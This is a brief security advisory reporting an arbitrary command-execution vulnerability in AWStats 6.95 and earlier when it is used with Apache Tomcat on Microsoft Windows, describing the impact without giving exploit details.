Awstats is prone to an arbitrary command-execution vulnerability. This issue occurs when Awstats is used along with Apache Tomcat in Microsoft Windows.

An attacker can exploit this vulnerability to execute arbitrary shell commands in the context of the webserver process. This may help attackers compromise the underlying system; other attacks are also possible.

AWStats 6.95 and prior versions are vulnerable.
